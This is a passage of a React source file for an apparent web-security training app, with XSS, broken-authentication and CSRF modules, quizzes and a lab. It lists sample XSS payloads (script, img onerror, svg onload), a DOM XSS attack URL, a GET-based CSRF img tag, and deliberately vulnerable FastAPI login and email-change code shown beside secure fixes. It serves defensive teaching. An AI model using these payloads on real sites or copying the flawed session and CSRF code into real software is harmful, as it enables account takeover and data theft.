                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// SAFE: Using textContent
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .textContent = 'Hello ' + name;
  
// Alternative: Create text node
const textNode = 
  document.createTextNode(name);
element.appendChild(textNode);

// Or escape HTML manually
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
element.innerHTML = escapeHtml(userInput);`}
                    </pre>
                  </div>
                </div>
              </div>

              {/* Best Practices Summary */}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">XSS Prevention Best Practices:</h4>
                <div className="grid md:grid-cols-2 gap-3 text-sm">
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Server-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>HTML Escape:</strong> Use html.escape() for all user input</li>
                      <li>• <strong>Context-Aware Encoding:</strong> Different escaping for HTML, JS, CSS, URLs</li>
                      <li>• <strong>Input Validation:</strong> Whitelist allowed characters/patterns</li>
                      <li>• <strong>Content Security Policy (CSP):</strong> Restrict script sources</li>
                    </ul>
                  </div>
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Client-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>Use textContent:</strong> Never innerHTML for user data</li>
                      <li>• <strong>Create Text Nodes:</strong> Use document.createTextNode()</li>
                      <li>• <strong>Avoid eval():</strong> Never use eval with user input</li>
                      <li>• <strong>Framework Protection:</strong> Use React, Vue (auto-escape)</li>
                      <li>• <strong>Manual Escaping:</strong> Escape HTML before inserting</li>
                    </ul>
                  </div>
                </div>

                <div className="mt-3 p-3 bg-slate-800 rounded-lg">
                  <p className="font-semibold text-blue-400 mb-2 text-sm">Content Security Policy Example:</p>
                  <PythonCode code={`from fastapi import Response

@app.get("/")
async def root():
    response = Response(content="<html>...</html>")
    
    # Add CSP header to block inline scripts
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:;"
    )
    
    return response`} />
                </div>
              </div>
            </div>

            <button
              onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all"
            >
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 XSS Testing Lab - Test All Three Types</h3>
              
              {/* Reflected XSS Test */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-red-500/30">
                <h4 className="font-bold text-red-400 mb-3">🔴 Test 1: Reflected XSS</h4>
                <p className="text-sm text-slate-300 mb-3">Try injecting scripts via search query (non-persistent):</p>
                
                <div className="mb-3">
                  <label className="block mb-2 text-sm font-semibold">Enter Search Query:</label>
                  <div className="flex gap-3">
                    <input
                      type="text"
                      value={labInput}
                      onChange={(e) => setLabInput(e.target.value)}
                      placeholder="Try: <script>alert('Reflected XSS')</script>"
                      className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                    />
                    <button
                      onClick={handleLabSubmit}
                      className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold"
                    >
                      Test
                    </button>
                  </div>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Common Reflected XSS Payloads to Try:</p>
                  <div className="space-y-1 text-xs">
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;img src=x onerror=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;svg onload=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;body onload=alert('XSS')&gt;</code>
                  </div>
                </div>
              </div>

              {labResult && (
                <div className="space-y-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Output (Reflected):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
                      <code className="text-sm text-slate-300">{labResult.vulnerable}</code>
                    </div>
                    {labResult.isAttack && (
                      <div className="space-y-2">
                        <p className="text-sm text-red-400 font-semibold">
                          ⚠️ XSS Attack Detected: {labResult.attackType}
                        </p>
                        <p className="text-sm text-slate-300 bg-red-900/20 p-3 rounded">
                          {labResult.attackExplanation}
                        </p>
                      </div>
                    )}
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-2">✅ Secure Output (Escaped):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
                      <code className="text-sm text-slate-300">{labResult.secure}</code>
                    </div>
                    <div className="mt-3 p-3 bg-green-900/20 rounded">
                      <p className="text-sm text-green-400 font-semibold mb-2">✓ Safe! HTML Escaping Applied:</p>
                      <div className="text-xs text-slate-300 space-y-1">
                        <p>• <code className="bg-slate-800 px-1 rounded">&lt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;lt;</code> (less than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">&gt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;gt;</code> (greater than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">"</code> → <code className="bg-slate-800 px-1 rounded">&amp;quot;</code> (quote)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">'</code> → <code className="bg-slate-800 px-1 rounded">&amp;#x27;</code> (apostrophe)</p>
                      </div>
                      <p className="text-sm text-slate-300 mt-2">
                        These conversions ensure the browser displays the characters as text instead of interpreting them as HTML/JavaScript code.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Stored XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-orange-500/30">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Understanding Stored XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  In a real Stored XSS scenario, malicious scripts are saved to the database and execute every time ANY user views the affected page.
                </p>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Example Flow:</p>
                  <div className="space-y-2 text-xs text-slate-300">
                    <p>1. Attacker posts comment: <code className="bg-slate-900 px-2 py-1 rounded text-red-300">&lt;script&gt;steal_cookie()&lt;/script&gt;</code></p>
                    <p>2. Comment stored in database WITHOUT sanitization</p>
                    <p>3. When Alice views comments → script executes, her cookie stolen</p>
                    <p>4. When Bob views comments → script executes, his cookie stolen</p>
                    <p>5. Every visitor gets attacked automatically!</p>
                  </div>
                  <div className="mt-3 p-2 bg-orange-900/20 border border-orange-500/50 rounded">
                    <p className="text-xs text-orange-400 font-semibold">⚠️ This is why Stored XSS is CRITICAL severity - one attack affects all users!</p>
                  </div>
                </div>
              </div>

              {/* DOM-based XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 border border-yellow-500/30">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Understanding DOM-Based XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  DOM-based XSS happens entirely in the browser. The malicious payload never reaches the server, making it invisible to server-side protections.
                </p>
                <div className="bg-slate-800 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Pattern:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-red-300">
{`// Reading from URL fragment (after #)
const name = window.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// Attack URL:
// https://site.com/page#<img src=x onerror=alert(1)>`}
                  </pre>
                </div>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Secure Alternative:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-green-300">
{`// Use textContent instead of innerHTML
const name = window.location.hash.substring(1);
document.getElementById('output').textContent = name;

// Or create text nodes
const textNode = document.createTextNode(name);
document.getElementById('output').appendChild(textNode);

// Manual HTML escaping function
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}`}
                  </pre>
                </div>
              </div>
            </div>

            <button
              onClick={() => setActiveTab('quiz')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
            >
              Ready for the Quiz? →
            </button>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// BROKEN AUTHENTICATION MODULE
// ============================================================================

const BrokenAuthModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');

  const vulnerableCode = `from fastapi import FastAPI, Response, Cookie
from typing import Optional

app = FastAPI()

# DANGEROUS: Predictable session IDs
session_counter = 1000

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """⚠️ VULNERABLE - Weak session management"""
    global session_counter
    
    # Simplified authentication (assume it works)
    if authenticate(username, password):
        # DANGEROUS: Predictable session ID
        session_id = str(session_counter)
        session_counter += 1
        
        # DANGEROUS: No secure flag, no httpOnly
        response.set_cookie(key="session", value=session_id)
        return {"message": "Logged in"}
    
    return {"error": "Invalid credentials"}`;

  const secureCode = `from fastapi import FastAPI, Response, Cookie
from typing import Optional
import secrets
import hashlib

app = FastAPI()

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """✅ SECURE - Strong session management"""
    
    # Authenticate user
    if authenticate(username, password):
        # ✅ SECURE: Cryptographically random session ID
        session_id = secrets.token_urlsafe(32)
        
        # ✅ SECURE: Hash the session ID before storing
        hashed_session = hashlib.sha256(session_id.encode()).hexdigest()
        
        # ✅ SECURE: HttpOnly, Secure, SameSite flags
        response.set_cookie(
            key="session",
            value=session_id,
            httponly=True,      # Prevents JavaScript access
            secure=True,        # HTTPS only
            samesite="strict",  # CSRF protection
            max_age=3600        # 1 hour expiration
        )
        
        return {"message": "Logged in securely"}
    
    return {"error": "Invalid credentials"}`;

  const comparisonCode = `from fastapi import FastAPI, Response
import secrets
import hashlib

app = FastAPI()

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """✅ SECURE - Strong session management"""
    
    if authenticate(username, password):
        # ❌ OLD (VULNERABLE): Predictable sequential session ID
        # session_id = str(session_counter)
        # session_counter += 1
        
        # ✅ NEW (SECURE): Cryptographically random session ID
        session_id = secrets.token_urlsafe(32)
        
        # ✅ NEW: Hash session ID for storage
        hashed_session = hashlib.sha256(session_id.encode()).hexdigest()
        
        # ❌ OLD (VULNERABLE): No security flags
        # response.set_cookie(key="session", value=session_id)
        
        # ✅ NEW (SECURE): Secure cookie with all protection flags
        response.set_cookie(
            key="session",
            value=session_id,
            httponly=True,
            secure=True,
            samesite="strict",
            max_age=3600
        )
        
        return {"message": "Logged in"}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes a session ID predictable and insecure?",
      options: [
        "Using HTTPS",
        "Using sequential numbers or timestamps",
        "Setting expiration time",
        "Using cookies"
      ],
      correct: 1,
      explanation: "Sequential numbers or timestamps are predictable. Attackers can guess valid session IDs and hijack user sessions."
    },
    {
      id: 2,
      question: "What does the 'httponly' cookie flag prevent?",
      options: [
        "Cookie transmission over HTTP",
        "JavaScript access to the cookie",
        "Cookie expiration",
        "Cookie encryption"
      ],
      correct: 1,
      explanation: "The httponly flag prevents JavaScript from accessing the cookie, protecting against XSS attacks that try to steal session tokens."
    },
    {
      id: 3,
      question: "What Python module should you use to generate secure random session IDs?",
      options: [
        "random",
        "uuid",
        "secrets",
        "hashlib"
      ],
      correct: 2,
      explanation: "The secrets module is designed for generating cryptographically strong random numbers suitable for security purposes like session IDs."
    },
    {
      id: 4,
      question: "What does the 'samesite=strict' cookie attribute protect against?",
      options: [
        "SQL Injection",
        "XSS attacks",
        "CSRF attacks",
        "DDoS attacks"
      ],
      correct: 2,
      explanation: "SameSite=strict prevents the browser from sending the cookie with cross-site requests, protecting against CSRF (Cross-Site Request Forgery) attacks."
    }
  ];

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Lock className="w-10 h-10 text-yellow-400" />
            <h1 className="text-4xl font-bold">Broken Authentication</h1>
          </div>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Examples', icon: Code },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              
              <p className="text-slate-300 mb-4">
                Broken Authentication occurs when authentication mechanisms are implemented incorrectly, allowing attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="mt-4 bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3">Common Weaknesses:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• Predictable session IDs (sequential numbers)</li>
                  <li>• Missing HttpOnly/Secure cookie flags</li>
                  <li>• No session expiration</li>
                  <li>• Weak password requirements</li>
                  <li>• No account lockout after failed attempts</li>
                </ul>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔑 Account Takeover</h4>
                  <p className="text-sm text-slate-300">Attackers gain full access to user accounts</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🎭 Identity Theft</h4>
                  <p className="text-sm text-slate-300">Impersonate legitimate users</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">💳 Financial Fraud</h4>
                  <p className="text-sm text-slate-300">Unauthorized transactions and theft</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📊 Data Breaches</h4>
                  <p className="text-sm text-slate-300">Access to sensitive personal information</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>

              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button
                  onClick={() => setCodeView('comparison')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                  }`}
                >
                  Before/After Comparison
                </button>
                <button
                  onClick={() => setCodeView('sidebyside')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                  }`}
                >
                  Side-by-Side View
                </button>
              </div>

              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-green-400 mb-3">✅ Secure Code with Changes:</h4>
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}

              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Authentication Best Practices:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Use secrets module:</strong> Generate cryptographically random session IDs</li>
                  <li>• <strong>Cookie Security Flags:</strong> HttpOnly, Secure, SameSite</li>
                  <li>• <strong>Session Expiration:</strong> Set reasonable timeouts</li>
                  <li>• <strong>Multi-Factor Authentication:</strong> Add second verification factor</li>
                  <li>• <strong>Rate Limiting:</strong> Prevent brute-force attacks</li>
                  <li>• <strong>Password Hashing:</strong> Use bcrypt, Argon2, or PBKDF2</li>
                </ul>
              </div>
            </div>

            <button
              onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
            >
              Continue to Examples →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">📚 Security Examples</h3>
              
              <div className="space-y-4">
                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Generate Secure Session ID:</h4>
                  <PythonCode code={`import secrets

# Generate cryptographically strong random session ID
session_id = secrets.token_urlsafe(32)
print(session_id)  # Example: 'xQz9K-vN8pR2mL4wH3jC6tY7fG1sD5bA9'`} />
                </div>

                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Hash Passwords Securely:</h4>
                  <PythonCode code={`from passlib.hash import bcrypt

# Hash password with bcrypt
password_hash = bcrypt.hash("user_password")

# Verify password
is_valid = bcrypt.verify("user_password", password_hash)`} />
                </div>

                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Implement Rate Limiting:</h4>
                  <PythonCode code={`from fastapi import FastAPI, HTTPException
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()

@app.post("/login")
@limiter.limit("5/minute")  # Max 5 attempts per minute
async def login(username: str, password: str):
    # Authentication logic here
    pass`} />
                </div>
              </div>

              <button
                onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }}
                className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
              >
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// CSRF MODULE
// ============================================================================

const CSRFModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const validSessionToken = 'a8f5f167f44f4964e6c998dee827110c';

  const vulnerableCode = `from fastapi import FastAPI, Cookie

app = FastAPI()

@app.post("/account/change-email")
async def change_email(new_email: str, session_id: str = Cookie(None)):
    """⚠️ VULNERABLE - No CSRF protection"""
    user = get_user_from_session(session_id)
    if not user:
        return {"error": "Not authenticated"}

    # DANGEROUS: Any website can trigger this request using the
    # victim's browser - cookies are attached automatically, and
    # nothing here proves the request came from our own frontend
    update_email(user.id, new_email)
    return {"message": "Email updated"}`;

  const secureCode = `from fastapi import FastAPI, Cookie, Header, HTTPException
import secrets

app = FastAPI()

@app.get("/csrf-token")
async def get_csrf_token(session_id: str = Cookie(None)):
    """✅ SECURE - Issue a per-session CSRF token"""
    token = secrets.token_urlsafe(32)
    store_csrf_token(session_id, token)
    return {"csrf_token": token}

@app.post("/account/change-email")
async def change_email(
    new_email: str,
    session_id: str = Cookie(None),
    x_csrf_token: str = Header(None)
):
    """✅ SECURE - Validates CSRF token on state-changing request"""
    user = get_user_from_session(session_id)
    if not user:
        raise HTTPException(401, "Not authenticated")

    # SAFE: Token must match what we issued for this session.
    # An attacker's page has no way to read or guess this value.
    if not x_csrf_token or not verify_csrf_token(session_id, x_csrf_token):
        raise HTTPException(403, "Invalid or missing CSRF token")

    update_email(user.id, new_email)
    return {"message": "Email updated"}`;

  const comparisonCode = `from fastapi import FastAPI, Cookie, Header, HTTPException

app = FastAPI()

@app.post("/account/change-email")
async def change_email(
    new_email: str,
    session_id: str = Cookie(None),
    x_csrf_token: str = Header(None)
):
    """✅ SECURE - Validates CSRF token on state-changing request"""
    user = get_user_from_session(session_id)
    if not user:
        raise HTTPException(401, "Not authenticated")

    # ❌ OLD (VULNERABLE): Only the session cookie was checked, and
    # cookies are attached automatically to cross-site requests too
    # if not user: return {"error": "Not authenticated"}

    # ✅ NEW (SECURE): Require a token the attacker's page can't obtain
    if not x_csrf_token or not verify_csrf_token(session_id, x_csrf_token):
        raise HTTPException(403, "Invalid or missing CSRF token")

    update_email(user.id, new_email)
    return {"message": "Email updated"}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What browser behavior does CSRF exploit?",
      options: [
        "Browsers cache passwords in plaintext",
        "Browsers automatically attach cookies to requests, even cross-site ones",
        "Browsers execute any JavaScript on any page",
        "Browsers ignore HTTPS certificates"
      ],
      correct: 1,
      explanation: "Browsers send cookies for a domain with every request to that domain, regardless of which site triggered the request. A form on attacker.com can submit to bank.com and the victim's session cookie goes along for the ride."
    },
    {
      id: 2,
      question: "Why isn't a valid session cookie enough to prove a request is legitimate?",
      options: [
        "Cookies expire too quickly to be useful",
        "Cookies are always visible in the URL",
        "An attacker's site can trigger the request without ever needing to know the cookie's value",
        "Cookies are encrypted and can't be checked server-side"
      ],
      correct: 2,
      explanation: "CSRF doesn't require stealing the cookie - the attacker just needs the victim's browser to send a request, and the browser handles attaching the cookie automatically."
    },
    {
      id: 3,
      question: "What makes a CSRF token effective protection?",
      options: [
        "It's stored in a cookie just like the session ID",
        "It's a secret tied to the session that only pages served by the real site can read and include",
        "It changes the color of the submit button",
        "It encrypts the entire request body"
      ],
      correct: 1,
      explanation: "A CSRF token is delivered to the legitimate page (e.g., via an API call or embedded form field) and must be replayed back to the server. An attacker's cross-origin page has no way to read that value, so it can't forge a valid request."
    },
    {
      id: 4,
      question: "Which cookie attribute provides additional CSRF mitigation?",
      options: [
        "HttpOnly",
        "Secure",
        "SameSite=Strict or Lax",
        "Path=/"
      ],
      correct: 2,
      explanation: "SameSite restricts when a browser will include a cookie on cross-site requests, blocking many CSRF attack patterns at the browser level - though it should complement, not replace, CSRF tokens."
    },
    {
      id: 5,
      question: "Which requests typically need CSRF protection?",
      options: [
        "All GET requests",
        "State-changing requests (POST, PUT, PATCH, DELETE)",
        "Only requests to /login",
        "Only requests over HTTP (not HTTPS)"
      ],
      correct: 1,
      explanation: "CSRF protection matters for requests that change state on the server. GET requests should never change state in the first place (and shouldn't be relied on for security-sensitive actions)."
    }
  ];

  const handleLabSubmit = () => {
    let result = { safe: false };

    if (labInput.trim() === '') {
      result.message = "🚫 Blocked - Missing CSRF Token";
      result.impact = "This is exactly what happens when attacker.com submits this form on your behalf: the browser automatically attaches your session cookie, but it has no way to read or forge your CSRF token, so the request is rejected.";
    } else if (labInput.trim() === validSessionToken) {
      result.safe = true;
      result.message = "✅ Request Accepted";
      result.impact = "The token matches the one issued for your session, proving this request originated from a page that could actually read it - i.e., your own logged-in session, not a forged cross-site request.";
    } else {
      result.message = "🚫 Blocked - Token Mismatch";
      result.impact = "The submitted token doesn't match what was issued for this session. Whether guessed, reused from another session, or simply fabricated, a mismatched token is rejected exactly like a missing one.";
    }

    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <RefreshCw className="w-10 h-10 text-pink-400" />
            <h1 className="text-4xl font-bold">Cross-Site Request Forgery (CSRF)</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                CSRF tricks a logged-in victim's browser into submitting a request to a site they're authenticated with, without their
                knowledge or consent. The attacker never needs to see the victim's session cookie - they just need the victim's browser
                to send it automatically, which it does for every request to that domain.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Technique</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Auto-Submit Form</td>
                        <td className="p-2 text-slate-300">Hidden HTML form on attacker.com auto-posts to victim-bank.com</td>
                        <td className="p-2 text-slate-300">Changes victim's email/password without consent</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">GET-Based CSRF</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">{'<img src="/transfer?to=attacker&amt=1000">'}</code></td>
